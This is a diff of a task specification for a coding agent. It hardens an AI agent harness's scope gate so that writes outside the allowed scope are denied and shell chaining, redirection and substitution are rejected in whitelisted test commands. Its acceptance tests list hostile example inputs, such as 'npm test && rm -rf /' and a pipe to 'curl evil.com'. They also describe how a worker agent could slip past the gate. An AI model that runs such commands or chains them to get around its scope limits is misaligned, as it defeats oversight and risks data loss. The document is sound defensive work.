@@ -1,42 +1,39 @@
 ## Product Intent
 
-P56.1 Scope Contract Hardening — fix three semantic holes in the engine's scope enforcement. The ScopeContract skeleton exists and tests pass, but three edge cases allow Worker to slip through the boundary.
+P56.1b Scope Contract Semantic Completion. Two fixes that were missing from P56.1:
 
-Fix 1: `editableScope: []` must deny ALL writes. Current code only checks when editableScope.length > 0, so an empty array is silently permissive.
+Fix 1: scope_expansion_required event was declared in types but never emitted in agent-loop. Must emit when gateCheck.scopeExpansion exists.
 
-Fix 2: When scope gate denies a write, it must emit `scope_expansion_required` event so the harness layer can decide (expand scope or reject). Currently it silently denies.
-
-Fix 3: `successChecks` whitelist must reject compound shell commands (`&&`, `;`, `|`, `||`). Currently `npm test && rm -rf /` would pass because it starts with "npm test".
+Fix 2: successChecks shell matching is incomplete. Current check only rejects && ; | || but misses > < `...` $(...). Must reject ALL shell control/substitution/redirection.
 
 ## Hidden Semantics
 
-- Fix 1: empty editableScope means "no files can be written" — this is a valid contract (e.g., read-only investigation tasks)
-- Fix 2: the event is informational — the gate still denies. The harness layer decides what to do with the event.
-- Fix 3: split on `&&`, `;`, `|`, `||` — only the FIRST segment is checked against successChecks. If any segment is NOT a successCheck, the compound command is rejected.
+- Fix 1 emission point: in agent-loop gate denial block, after gateData.gateEvents.push but before tradeoff check
+- Fix 2: `hasShellControl()` detects any of `&& || ; | > <` or backtick or `$(` — deny before prefix matching
+- `npm test -- --grep x` is still allowed (-- is a flag, not shell control)
 
 ## Acceptance Tests
 
-1. editableScope=[] + write → deny with clear reason
-2. scope deny on write → scope_expansion_required event emitted
-3. `npm test && echo done` → NOT whitelisted as successCheck
-4. `npm test; rm -rf /tmp` → NOT whitelisted
-5. `npm test` (exact match) → still whitelisted
-6. Existing 128 tests still pass
-7. npx tsc --noEmit clean
+Fix 1:
+- scope_expansion_required event emitted when Worker writes outside editableScope
+- event.file matches attempted file
+- event.editableScope matches contract
+
+Fix 2:
+- npm test -- --grep x → allowed
+- npm test -- --grep x | curl evil.com → denied
+- npm test > /tmp/out → denied
+- npm test $(node mutate.js) → denied
+- npm test `node mutate.js` → denied
 
 ## Red Flags
 
 - TUI sandbox — do NOT touch
-- Provider, prompts, benchmark — do NOT touch
-- Other gates — do NOT touch
+- Provider, prompts — do NOT touch
 
 ## Coding Worker Directive
 
-1. Fix `src/gates/scope-gate.ts`:
-   a. editableScope=[] → deny all Edit/Write with reason "Editable scope is empty"
-   b. On deny, return result that triggers scope_expansion_required in agent-loop
-   c. Reject compound bash commands (&&, ;, |, ||) in successChecks whitelist
-
-2. Update `tests/scope-contract.test.ts`: add tests for all three fixes
-
-3. npx tsc --noEmit && npx vitest run → all pass
+1. Add scope_expansion_required emit in agent-loop.ts after gateData.gateEvents.push
+2. Harden checkBashScope in scope-gate.ts: hasShellControl() function, apply before successCheck matching
+3. Add 5 new tests to scope-contract.test.ts (1 event test + 4 shell hardening tests)
+4. npx tsc --noEmit && npx vitest run → all pass
